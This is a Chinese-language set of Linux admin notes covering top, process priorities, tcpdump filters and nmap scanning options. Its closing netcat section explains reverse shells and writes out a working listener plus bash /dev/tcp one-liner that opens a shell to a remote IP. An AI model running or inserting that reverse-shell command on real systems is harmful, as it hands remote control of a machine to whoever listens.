# 性能管理

## 一、CPU
### 1. top

load：在一段时间内，CPU正在处理以及等待CPU处理的进程数之和。

S：进程状态。D表示不可中断的睡眠状态；R表示运行；S表示睡眠；T表示跟踪/停止；Z表示僵尸进程。


```
ps -mp 19505 -o THREAD,tid,time
top -Hp 19505 -d 1 -n 1
```
###### PR和NI

进程的PR与NI列，这两个都代表了进程的优先级

PR是内核调度时使用的优先级(priority)，默认20，值越大优先级越低

NI是开放给用户调整的优先级(nice)，默认0，nice值越大，则进程会表现得越谦让(nice)，先让别的进程获得CPU，表现为优先级越低，最大值19。

###### 修改进程194023的NI值为5
```
renice -n 5 -p 194023
```

在内核代码里，PR才是CPU调度器真正使用的优化级，而NI只是开放给用户修改的。

NI值是给普通进程使用的，范围是[-20 ~ 19]共39个级别，对应PR就是[0 ~ 39]。

PR的取值范围可以是[-100 ~ 39]共139个级别，其中[-100, -1]是给实时进程用的。
#### 交互式命令
```
1 线程
z 颜色高亮
b 加粗
t 任务
m 内存

```

### 参考资料
[TOP中的PR和NI](https://juejin.cn/post/7040095840089669639)



## 二、内存

## 三、磁盘

## 四、网络

### 1. tcpdump

###### 格式：

```
系统时间 来源主机.端口 > 目标主机.端口 数据包参数
```

###### 1. 指定IP和端口

```
tcpdump tcp port 23 and host 210.27.48.1
```

###### 2. 开始和结束的数据包

```
tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'
```

### 2. nmap

Nmap用于在远程机器上探测网络，执行安全扫描，网络审计和搜寻开放端口。

###### NMAP命令用法

```
nmap [Scan Type(s)] [Options] {target specification}
```
默认会显示端口，服务名，mac等信息

######  多目标
- 空格分隔的多个地址
- 使用*通配符
- 逗号分隔ip最后一个字节，如192.168.0.101,102,103
- ip范围，如192.168.0.101-200

###### options
- -A 操作系统和版本检测，路由跟踪功能
- -sA 主机是否使用了包过滤器或防火墙
- -sP IP范围中哪些在线
- –iflist 选项检测主机接口和路由信息。
- -sV 查找主机服务版本号

包过滤防火墙会阻断标准的ICMP ping请求，在这种情况下，我们可以使用TCP ACK(PA)和TCP Syn(PS)方法来扫描远程主机。


```
nmap -PA -p 22,80 192.168.0.101
nmap -PS -p 22,80 192.168.0.101
```

### 3. netcat

反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。

> 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。



##### 监听和连接
```
nc -lvp 6767
bash -i >/dev/tcp/10.201.61.194/6767  0>&1 2>&1
```
